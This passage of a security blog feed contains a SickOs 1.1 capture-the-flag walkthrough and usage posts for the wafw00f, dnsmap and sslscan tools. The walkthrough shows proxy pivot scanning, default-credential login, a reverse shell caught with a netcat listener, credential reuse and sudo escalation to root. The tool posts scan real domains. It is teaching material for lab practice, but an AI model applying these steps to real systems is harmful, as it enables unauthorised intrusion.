Generic Detection results:
No WAF detected by the generic detection
Number of requests: 13
```</p>

<ul>
<li>establish there is a WAF but without detecting its type</li>
</ul>


<p>```
wafw00f -a microsoft.com</p>

<pre><code>                             ^     ^
    _   __  _   ____ _   __  _    _   ____
   ///7/ /.' \ / __////7/ /,' \ ,' \ / __/
  | V V // o // _/ | V V // 0 // 0 // _/
  |_n_,'/_n_//_/   |_n_,' \_,' \_,'/_/
                            &lt;
                             ...'

WAFW00F - Web Application Firewall Detection Tool

By Sandro Gauci &amp;&amp; Wendel G. Henrique
</code></pre>

<p>Checking <a href="http://microsoft.com">http://microsoft.com</a>
Generic Detection results:
The site <a href="http://microsoft.com">http://microsoft.com</a> seems to be behind a WAF or some sort of security solution
Reason: The server returned a different response code when a string trigged the blacklist.
Normal response code is &ldquo;400&rdquo;, while the response code to an attack is &ldquo;301&rdquo;
Number of requests: 13
```</p>

<p>```</p>

<hr />

<p>/ You&rsquo;ll wish that you had done some of \
| the hard things when they were easier |
\ to do.                                /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SickOs 1.1 writeup]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/28/sickos-1-dot-1-writeup/"/>
    <updated>2017-06-28T08:09:14-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/28/sickos-1-dot-1-writeup</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s target is similar to what can be found in OSCP labs. The goal is to obtain root privileges and get the flag. Let&rsquo;s dive right in!</p>

<!-- more -->


<h2>Recon</h2>

<p>Nmap results are:</p>

<p>```
nmap -T4 -p- -A 192.168.217.143</p>

<p>PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)
|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)
|<em>  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)
3128/tcp open   http-proxy Squid http proxy 3.1.19
| http-open-proxy: Potentially OPEN proxy.
|</em>Methods supported: GET HEAD
|<em>http-server-header: squid/3.1.19
|</em>http-title: ERROR: The requested URL could not be retrieved
8080/tcp closed http-proxy
```</p>

<p>This is an interesting one, there are no obvious points of entry, but there is a Squid proxy in place. Navigating directly to port 3128 didn&rsquo;t yield anything besides an error of an invalid URL request. I googled the Squid version and found a potentially useful <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/squid_pivot_scanning">Metasploit module</a>:</p>

<blockquote><p>A misconfigured Squid proxy can allow an attacker to make requests on his behalf. This may give the attacker
information about devices that he cannot reach but the Squid proxy can. For example, an attacker can make requests
for internal IP addresses against a misconfigurated open Squid proxy exposed to the Internet, therefore performing an
internal port scan. The error messages returned by the proxy are used to determine if the port is open or not. Many
Squid proxies use custom error codes so your mileage may vary. The open_proxy module can be used to test for open
proxies, though a Squid proxy does not have to be open in order to allow for pivoting (e.g. an Intranet Squid proxy
which allows the attack to pivot to another part of the network).</p></blockquote>

<p>Here are the options I&rsquo;ve used for the scanner:</p>

<p>```
msf auxiliary(squid_pivot_scanning) > options</p>

<p>Module options (auxiliary/scanner/http/squid_pivot_scanning):</p>

<p>   Name          Current Setting                                  Required  Description</p>

<hr />

<p>   CANARY_IP     1.2.3.4                                          yes       The IP to check if the proxy always answers positively; the IP should not respond.
   MANUAL_CHECK  true                                             yes       Stop the scan if server seems to answer positively to every request
   PORTS         21,80,139,443,445,1433,1521,1723,3389,8080,9100  yes       Ports to scan; must be TCP
   Proxies                                                        no        A proxy chain of format type:host:port[,type:host:port][&hellip;]
   RANGE         192.168.217.143                                  yes       IPs to scan through Squid proxy
   RHOSTS        192.168.217.143                                  yes       The target address range or CIDR identifier
   RPORT         3128                                             yes       The target port (TCP)
   SSL           false                                            no        Negotiate SSL/TLS for outgoing connections
   THREADS       1                                                yes       The number of concurrent threads
   VHOST                                                          no        HTTP server virtual host
```</p>

<p>And the output:</p>

<p>```
msf auxiliary(squid_pivot_scanning) > run</p>

<p>[+] [192.168.217.143] 192.168.217.143 is alive but 21 is CLOSED
[+] [192.168.217.143] 192.168.217.143:80 seems OPEN
[+] [192.168.217.143] 192.168.217.143 is alive but 139 is CLOSED
[+] [192.168.217.143] 192.168.217.143 is alive but 445 is CLOSED
[+] [192.168.217.143] 192.168.217.143 is alive but 1433 is CLOSED
[+] [192.168.217.143] 192.168.217.143 is alive but 1521 is CLOSED
[+] [192.168.217.143] 192.168.217.143 is alive but 1723 is CLOSED
[+] [192.168.217.143] 192.168.217.143 is alive but 3389 is CLOSED
[+] [192.168.217.143] 192.168.217.143 is alive but 8080 is CLOSED
[+] [192.168.217.143] 192.168.217.143 is alive but 9100 is CLOSED
[<em>] Scanned 1 of 1 hosts (100% complete)
[</em>] Auxiliary module execution completed
```</p>

<p>It appears port 80 is open on the target. I configured my browser to use the Squid proxy and went to the web server:</p>

<p><img class="center" src="/images/pentest/sickos/1-web.png" title="&lsquo;web server&rsquo; &lsquo;webpage&rsquo;" ></p>

<p>If it doesn&rsquo;t appear there is much content on the web server, we have to get more information by force _;) Since I had to take the proxy into consideration, I preferred a CLI tool rather than a GUI like Dirbuster. How fortunate that there is a CLI companion to Dirbuster, called <em>sound of drums</em>: <strong>dirb</strong>!</p>

<h3>dirb description</h3>

<p>Homepage: <a href="http://dirb.sourceforge.net/">http://dirb.sourceforge.net/</a></p>

<blockquote><p>DIRB is a Web Content Scanner. It looks for existing (and/or hidden) Web
Objects. It basically works by launching a dictionary based attack against
a web server and analizing the response.</p>

<p>DIRB comes with a set of preconfigured attack wordlists for easy usage but
you can use your custom wordlists. Also DIRB sometimes can be used as a
classic CGI scanner, but remember is a content scanner not a vulnerability scanner.</p>

<p>DIRB main purpose is to help in professional web application auditing.
Specially in security related testing. It covers some holes not covered by
classic web vulnerability scanners. DIRB looks for specific web objects that
other generic CGI scanners can&rsquo;t look for. It doesn&rsquo;t search vulnerabilities
nor does it look for web contents that can be vulnerables.</p></blockquote>

<h3>dirb options</h3>

<h2>``` </h2>

<p>DIRB v2.22</p>

<h2>By The Dark Raver</h2>

<p>./dirb &lt;url_base> [&lt;wordlist_file(s)>] [options]</p>

<p>========================= NOTES =========================
 &lt;url_base> : Base URL to scan. (Use -resume for session resuming)
 &lt;wordlist_file(s)> : List of wordfiles. (wordfile1,wordfile2,wordfile3&hellip;)</p>

<p>======================== HOTKEYS ========================
 &lsquo;n&rsquo; &ndash;> Go to next directory.
 &lsquo;q&rsquo; &ndash;> Stop scan. (Saving state for resume)
 &lsquo;r&rsquo; &ndash;> Remaining scan stats.</p>

<p>======================== OPTIONS ========================
 -a &lt;agent_string> : Specify your custom USER_AGENT.
 -c &lt;cookie_string> : Set a cookie for the HTTP request.
 -f : Fine tunning of NOT_FOUND (404) detection.
 -H &lt;header_string> : Add a custom header to the HTTP request.
 -i : Use case-insensitive search.
 -l : Print &ldquo;Location&rdquo; header when found.
 -N &lt;nf_code>: Ignore responses with this HTTP code.
 -o &lt;output_file> : Save output to disk.
 -p &lt;proxy[:port]> : Use this proxy. (Default port is 1080)
 -P &lt;proxy_username:proxy_password> : Proxy Authentication.
 -r : Don&rsquo;t search recursively.
 -R : Interactive recursion. (Asks for each directory)
 -S : Silent Mode. Don&rsquo;t show tested words. (For dumb terminals)
 -t : Don&rsquo;t force an ending &lsquo;/&rsquo; on URLs.
 -u &lt;username:password> : HTTP Authentication.
 -v : Show also NOT_FOUND pages.
 -w : Don&rsquo;t stop on WARNING messages.
 -X <extensions> / -x &lt;exts_file> : Append each word with this extensions.
 -z <milisecs> : Add a miliseconds delay to not cause excessive Flood.</p>

<p>======================== EXAMPLES =======================
 ./dirb <a href="http://url/directory/">http://url/directory/</a> (Simple Test)
 ./dirb <a href="http://url/">http://url/</a> -X .html (Test files with &lsquo;.html&rsquo; extension)
 ./dirb <a href="http://url/">http://url/</a> /usr/share/dirb/wordlists/vulns/apache.txt (Test with apache.txt wordlist)
 ./dirb <a href="https://secure_url/">https://secure_url/</a> (Simple Test with SSL)
```</p>

<p>This tool is exactly what I needed! And it finished really fast! Here are its discoveries:</p>

<p>```
dirb <a href="http://192.168.217.143">http://192.168.217.143</a> /usr/share/wordlists/dirb/common.txt -p 192.168.217.143:3128</p>

<hr />

<p>DIRB v2.22</p>

<h2>By The Dark Raver</h2>

<p>START_TIME: Thu Jun 29 06:45:12 2017
URL_BASE: <a href="http://192.168.217.143/">http://192.168.217.143/</a>
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt
PROXY: 192.168.217.143:3128</p>

<hr />

<p>GENERATED WORDS: 4612</p>

<p>&mdash;&mdash; Scanning URL: <a href="http://192.168.217.143/">http://192.168.217.143/</a> &mdash;&mdash;
+ <a href="http://192.168.217.143/cgi-bin/">http://192.168.217.143/cgi-bin/</a> (CODE:403|SIZE:291)                                                                                             <br/>
+ <a href="http://192.168.217.143/connect">http://192.168.217.143/connect</a> (CODE:200|SIZE:109)                                                                                              <br/>
+ <a href="http://192.168.217.143/index">http://192.168.217.143/index</a> (CODE:200|SIZE:21)                                                                                                 <br/>
+ <a href="http://192.168.217.143/index.php">http://192.168.217.143/index.php</a> (CODE:200|SIZE:21)                                                                                             <br/>
+ <a href="http://192.168.217.143/robots">http://192.168.217.143/robots</a> (CODE:200|SIZE:45)                                                                                                <br/>
+ <a href="http://192.168.217.143/robots.txt">http://192.168.217.143/robots.txt</a> (CODE:200|SIZE:45)                                                                                            <br/>
+ <a href="http://192.168.217.143/server-status">http://192.168.217.143/server-status</a> (CODE:403|SIZE:296)</p>

<hr />

<p>END_TIME: Thu Jun 29 06:45:16 2017
DOWNLOADED: 4612 &ndash; FOUND: 7
```</p>

<p>Quite interesting. Some resources are forbidden, connect is a Python script with the following content:</p>

<p>```</p>

<h1>!/usr/bin/python</h1>

<p>print &ldquo;I Try to connect things very frequently\n&rdquo;
print &ldquo;You may want to try my services&rdquo;
```</p>

<p>The robots.txt file seems the most useful:</p>

<p><code>
User-agent: *
Disallow: /
Dissalow: /wolfcms
</code></p>

<p>A hidden CMS, eh? I went there to find this:</p>

<p><img class="center" src="/images/pentest/sickos/1-wolfcms.png" title="&lsquo;wolfcms&rsquo; &lsquo;wolfcms&rsquo;" ></p>

<p>I ran Nikto on it, didn&rsquo;t find anything interesting besides an outdated Apache version. Same with other scanners and another round of directory bruteforcing, nothing useful. I googled for WolfCMS, and found an arbitrary file upload exploit, but it required an authenticated user. So next I searched for the admin interface, and found an answer on <a href="https://www.wolfcms.org/forum/topic2034.html">their forums</a>. So I appended <em>?admin</em> to the path and got redirected to <a href="http://192.168.217.143/wolfcms/?/admin/login">http://192.168.217.143/wolfcms/?/admin/login</a></p>

<p><img class="center" src="/images/pentest/sickos/1-login.png" title="&lsquo;wolfcms admin&rsquo; &lsquo;wolfcms admin login&rsquo;" ></p>

<p>I couldn&rsquo;t find default credentials, no obvious SQL errors, so I tried a few common combinations, and imagine the surprise when <em>admin:admin</em> worked!</p>

<p><img class="center" src="/images/pentest/sickos/1-admin.png" title="&lsquo;admin&rsquo; &lsquo;wolfcms admin panel&rsquo;" ></p>

<h2>Exploitation</h2>

<p>Now I can use the <a href="https://www.exploit-db.com/exploits/36818/">exploit</a>. The vulnerability exists in the CMS' File Manager, which doesn&rsquo;t restrict the types of files that can be uploaded. But I forgot that I had to access the CMS through a proxy, and didn&rsquo;t want to modify the code, so instead I manually uploaded Pentestmonkey&rsquo;s reverse shell through the interface:</p>

<p><img class="center" src="/images/pentest/sickos/1-file.png" title="&lsquo;file manager&rsquo; &lsquo;wolfcms file upload&rsquo;" ></p>

<p>I set up a Netcat listener and navigated to the shell:</p>

<p><code>
root@kali:~# nc -vnlp 8888
listening on [any] 8888 ...
connect to [192.168.217.132] from (UNKNOWN) [192.168.217.143] 33709
Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
 18:12:38 up  3:14,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
</code></p>

<p>I looked inside the web directory and found a <strong>config.php</strong> file in <code>/var/www/wolfcms</code> that contained a set of credentials:</p>

<p><code>
// Database settings:
define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
define('DB_USER', 'root');
define('DB_PASS', 'john@123');
</code></p>

<p>I also noted the existence of a sickos user, based on the home directories. Tried SSH'ing as root, no joy. But trying as sickos with the above password worked! Inside sickos' home, I noticed a bash_history file:</p>

<p><code>
sickos@SickOs:~$ cat .bash_history
sudo su
exit
</code></p>

<p>Woot, could it be that easy? I did a <code>sudo -l</code>:</p>

<p>```
User sickos may run the following commands on this host:</p>

<pre><code>(ALL : ALL) ALL
</code></pre>

<p>```</p>

<p>Root was only a <em>sudo su</em> away!</p>

<p><code>
root@SickOs:~# whoami
root
</code></p>

<p>And the flag:</p>

<p>```
root@SickOs:~# cat a0216ea4d51874464078c618298b1367.txt
If you are viewing this!!</p>

<p>ROOT!</p>

<p>You have Succesfully completed SickOS1.1.
Thanks for Trying
```</p>

<p>Thanks D4rk for an interesting machine, with a nice twist of Squid!</p>

<p>```</p>

<hr />

<p>&lt; You will outgrow your usefulness. ></p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[dnsmap - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/27/dnsmap-kali-linux-tools/"/>
    <updated>2017-06-27T04:12:46-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/27/dnsmap-kali-linux-tools</id>
    <content type="html"><![CDATA[<p>Today we&rsquo;ll explore another tool for DNS enumeration: the DNS Network Mapper (dnsmap). Although at the time of this post, its last update was in 2010, this tool has survived the passage of time, and has been packaged with versions of both Backtrack and Kali. There is quite a wealth of information about the tool on its homepage, and it comes with a built-in wordlist for domain bruteforcing.</p>

<p>Homepage: <a href="https://github.com/makefu/dnsmap">https://github.com/makefu/dnsmap</a></p>

<!-- more -->


<h2>dnsmap description</h2>

<blockquote><p>dnsmap was originally released back in 2006 and was inspired by the
fictional story &ldquo;The Thief No One Saw&rdquo; by Paul Craig, which can be found
in the book &ldquo;Stealing the Network &ndash; How to 0wn the Box&rdquo;</p>

<p>dnsmap is mainly meant to be used by pentesters during the information
gathering/enumeration phase of infrastructure security assessments. During the
enumeration stage, the security consultant would typically discover the target
company&rsquo;s IP netblocks, domain names, phone numbers, etc &hellip;</p>

<p>Subdomain brute-forcing is another technique that should be used in the
enumeration stage, as it&rsquo;s especially useful when other domain enumeration
techniques such as zone transfers don&rsquo;t work (I rarely see zone transfers
being <em>publicly</em> allowed these days by the way).</p>

<p>LIMITATIONS</p>

<p>Lack of multi-threading. This speed issue will hopefully be resolved in future versions.</p>

<p>FUN THINGS THAT CAN HAPPEN</p>

<ol>
<li><p>Finding interesting remote access servers (e.g.: <a href="https://extranet.targetdomain.com">https://extranet.targetdomain.com</a>)</p></li>
<li><p>Finding badly configured and/or unpatched servers (e.g.: test.targetdomain.com)</p></li>
<li><p>Finding new domain names which will allow you to map non-obvious/hard-to-find netblocks
of your target organization (registry lookups &ndash; aka whois is your friend)</p></li>
<li><p>Sometimes you find that some bruteforced subdomains resolve to internal IP addresses
(RFC 1918). This is great as sometimes they are real up-to-date &ldquo;A&rdquo; records which means
that it <em>is</em> possible to enumerate internal servers of a target organization from the
Internet by only using standard DNS resolving (as oppossed to zone transfers for instance).</p></li>
<li><p>Discover embedded devices configured using Dynamic DNS services (e.g.: linksys-cam.com).
This method is an alternative to finding devices via Google hacking techniques</p></li>
</ol>


<p>USAGE</p>

<p>Bruteforcing can be done either with dnsmap&rsquo;s built-in wordlist or a user-supplied wordlist.
Results can be saved in CSV and human-readable format for further processing. dnsmap does
NOT require root privileges to be run, and should NOT be run with such privileges for security reasons.</p></blockquote>

<h2>dnsmap options</h2>

<p>```
dnsmap 0.30 &ndash; DNS Network Mapper by pagvac (gnucitizen.org)</p>

<p>usage: dnsmap &lt;target-domain> [options]
options:
-w &lt;wordlist-file>
-r &lt;regular-results-file>
-c &lt;csv-results-file>
-d &lt;delay-millisecs>
-i &lt;ips-to-ignore> (useful if you&rsquo;re obtaining false positives)</p>

<p>e.g.:
dnsmap target-domain.foo
dnsmap target-domain.foo -w yourwordlist.txt -r /tmp/domainbf_results.txt
dnsmap target-fomain.foo -r /tmp/ -d 3000
dnsmap target-fomain.foo -r ./domainbf_results.txt
```</p>

<h2>dnsmap usage</h2>

<p>```
dnsmap slack.com
dnsmap 0.30 &ndash; DNS Network Mapper by pagvac (gnucitizen.org)</p>

<p>[+] warning: domain might use wildcards. 54.230.203.126 will be ignored from results
[+] searching (sub)domains for slack.com using built-in wordlist
[+] using maximum random delay of 10 millisecond(s) between requests</p>

<p>email.slack.com
IP address #1: 34.196.74.192
IP address #2: 54.88.163.82</p>

<p>files.slack.com
IP address #1: 52.85.178.60</p>

<p>qa.slack.com
IP address #1: 54.192.201.191</p>

<p>staging.slack.com
IP address #1: 52.87.251.252</p>

<p>upload.slack.com
IP address #1: 34.197.50.42
IP address #2: 52.22.100.1
IP address #3: 52.44.55.102
IP address #4: 52.54.239.215</p>

<p>[+] 5 (sub)domains and 9 IP address(es) found
[+] completion time: 122 second(s)
```</p>

<p>Here is how the output looks in the CSV format:</p>

<p><img class="center" src="/images/tools/dnsmap.png" title="&lsquo;dnsmap&rsquo; &lsquo;dnsmap CSV report&rsquo;" ></p>

<p>```</p>

<hr />

<p>/ In the stairway of life, you&rsquo;d best \
\ take the elevator.                  /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[sslscan - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/24/sslscan-kali-linux-tools/"/>
    <updated>2017-06-24T07:36:03-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/24/sslscan-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: you want to assess the SSL security posture of a target by listing the supported cipher suites. sslscan is a fast SSL/TLS scanner that has been extended from its original version, and at the time of this post, its last update was 2 days ago.</p>

<p>Homepage: <a href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a></p>

<!-- more -->


<h2>sslscan description</h2>

<blockquote><p>sslscan  queries SSL/TLS services, such as HTTPS, in order to determine the ciphers that are supported.</p>

<p>SSLScan is designed to be easy, lean and fast. The output includes preferred  ciphers of the SSL/TLS service, and
text and XML output formats are supported. It is TLS SNI aware when used with a  supported  version of OpenSSL.</p>

<p>Output is colour coded to indicate security issues. Colours are as follows:</p>

<p>Red Background:  NULL cipher (no encryption)</p>

<p>Red:             Broken cipher (&lt;= 40 bit), broken  protocol  (SSLv2  or SSLv3) or broken certificate signing
algorithm (MD5)</p>

<p>Yellow:           Weak  cipher  (&lt;=  56  bit or RC4) or weak certificate signing algorithm (SHA-1)</p>

<p>Purple:          Anonymous cipher (ADH or AECDH)</p></blockquote>

<p>Manpage: <a href="http://manpages.ubuntu.com/manpages/xenial/man1/sslscan.1.html">http://manpages.ubuntu.com/manpages/xenial/man1/sslscan.1.html</a></p>

<h2>sslscan options</h2>

<p>```</p>

<pre><code>       ___ ___| |___  ___ __ _ _ __
      / __/ __| / __|/ __/ _` | '_ \
      \__ \__ \ \__ \ (_| (_| | | | |
      |___/___/_|___/\___\__,_|_| |_|


    1.11.10-static
    OpenSSL 1.0.2-chacha (1.0.2g-dev)
</code></pre>

<p>Command:
  sslscan [Options] [host:port | host]</p>

<p>Options:
  &mdash;targets=<file>     A file containing a list of hosts to check.</p>

<pre><code>                   Hosts can  be supplied  with ports (host:port)
</code></pre>

<p>  &mdash;sni-name=<name>    Hostname for SNI
  &mdash;ipv4               Only use IPv4
  &mdash;ipv6               Only use IPv6
  &mdash;show-certificate   Show full certificate information
  &mdash;no-check-certificate  Don&rsquo;t warn about weak certificate algorithm or keys
  &mdash;show-client-cas    Show trusted CAs for TLS client auth
  &mdash;show-ciphers       Show supported client ciphers
  &mdash;show-cipher-ids    Show cipher ids
  &mdash;show-times         Show handhake times in milliseconds
  &mdash;ssl2               Only check SSLv2 ciphers
  &mdash;ssl3               Only check SSLv3 ciphers
  &mdash;tls10              Only check TLSv1.0 ciphers
  &mdash;tls11              Only check TLSv1.1 ciphers
  &mdash;tls12              Only check TLSv1.2 ciphers
  &mdash;tlsall             Only check TLS ciphers (all versions)
  &mdash;ocsp               Request OCSP response from server
  &mdash;pk=<file>          A file containing the private key or a PKCS#12 file</p>

<pre><code>                   containing a private key/certificate pair
</code></pre>

<p>  &mdash;pkpass=<password>  The password for the private  key or PKCS#12 file
  &mdash;certs=<file>       A file containing PEM/ASN1 formatted client certificates
  &mdash;no-ciphersuites    Do not check for supported ciphersuites
  &mdash;no-fallback        Do not check for TLS Fallback SCSV
  &mdash;no-renegotiation   Do not check for TLS renegotiation
  &mdash;no-compression     Do not check for TLS compression (CRIME)
  &mdash;no-heartbleed      Do not check for OpenSSL Heartbleed (CVE-2014-0160)
  &mdash;starttls-ftp       STARTTLS setup for FTP
  &mdash;starttls-imap      STARTTLS setup for IMAP
  &mdash;starttls-irc       STARTTLS setup for IRC
  &mdash;starttls-ldap      STARTTLS setup for LDAP
  &mdash;starttls-pop3      STARTTLS setup for POP3
  &mdash;starttls-smtp      STARTTLS setup for SMTP
  &mdash;starttls-mysql     STARTTLS setup for MYSQL
  &mdash;starttls-xmpp      STARTTLS setup for XMPP
  &mdash;starttls-psql      STARTTLS setup for PostgreSQL
  &mdash;xmpp-server        Use a server-to-server XMPP handshake
  &mdash;http               Test a HTTP connection
  &mdash;rdp                Send RDP preamble before starting scan
  &mdash;bugs               Enable SSL implementation bug work-arounds
  &mdash;timeout=<sec>      Set socket timeout. Default is 3s
  &mdash;sleep=<msec>       Pause between connection request. Default is disabled
  &mdash;xml=<file>         Output results to an XML file</p>

<pre><code>                   &lt;file&gt; can be -, which means stdout
</code></pre>

<p>  &mdash;version            Display the program version
  &mdash;verbose            Display verbose output
  &mdash;no-cipher-details  Disable EC curve names and EDH/RSA key lengths output
  &mdash;no-colour          Disable coloured output
  &mdash;help               Display the  help text  you are  now reading</p>

<p>Example:
  sslscan 127.0.0.1
  sslscan [::1]
```</p>

<h2>sslscan usage</h2>

<p>```
sslscan <a href="https://www.cylance.com">https://www.cylance.com</a>
Version: 1.11.10-static
OpenSSL 1.0.2-chacha (1.0.2g-dev)</p>

<p>Testing SSL server www.cylance.com on port 443 using SNI name www.cylance.com</p>

<p>  TLS Fallback SCSV:
Server supports TLS Fallback SCSV</p>

<p>  TLS renegotiation:
Secure session renegotiation supported</p>

<p>  TLS Compression:
Compression disabled</p>

<p>  Heartbleed:
TLS 1.2 not vulnerable to heartbleed
TLS 1.1 not vulnerable to heartbleed
TLS 1.0 not vulnerable to heartbleed</p>

<p>  Supported Server Cipher(s):
Preferred TLSv1.2  128 bits  ECDHE-RSA-AES128-GCM-SHA256   Curve P-256 DHE 256
Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA256       Curve P-256 DHE 256
Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-GCM-SHA384   Curve P-256 DHE 256
Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA384       Curve P-256 DHE 256
Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
Accepted  TLSv1.2  128 bits  AES128-GCM-SHA256          <br/>
Accepted  TLSv1.2  128 bits  AES128-SHA256              <br/>
Accepted  TLSv1.2  128 bits  AES128-SHA                 <br/>
Accepted  TLSv1.2  256 bits  AES256-GCM-SHA384          <br/>
Accepted  TLSv1.2  256 bits  AES256-SHA256              <br/>
Accepted  TLSv1.2  256 bits  AES256-SHA                 <br/>
Accepted  TLSv1.2  112 bits  DES-CBC3-SHA               <br/>
Preferred TLSv1.1  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
Accepted  TLSv1.1  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
Accepted  TLSv1.1  128 bits  AES128-SHA                 <br/>
Accepted  TLSv1.1  256 bits  AES256-SHA                 <br/>
Accepted  TLSv1.1  112 bits  DES-CBC3-SHA               <br/>
Preferred TLSv1.0  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
Accepted  TLSv1.0  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
Accepted  TLSv1.0  128 bits  AES128-SHA                 <br/>
Accepted  TLSv1.0  256 bits  AES256-SHA                 <br/>
Accepted  TLSv1.0  112 bits  DES-CBC3-SHA</p>

<p>  SSL Certificate:
Signature Algorithm: sha256WithRSAEncryption
RSA Key Strength:    2048</p>

<p>Subject:  <em>.cylance.com
Altnames: DNS:</em>.cylance.com, DNS:cylance.com, DNS:www.cylance.com, DNS:info.cylance.com, DNS:blog.cylance.com, DNS:education.cylance.com, DNS:support.cylance.com
Issuer:   DigiCert SHA2 Secure Server CA</p>

<p>Not valid before: May 24 00:00:00 2017 GMT
Not valid after:  May 29 12:00:00 2018 GMT
```</p>

<p>```</p>

<hr />

<p>/ Q: Do you know what the death rate \
\ around here is? A: One per person. /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
</feed>
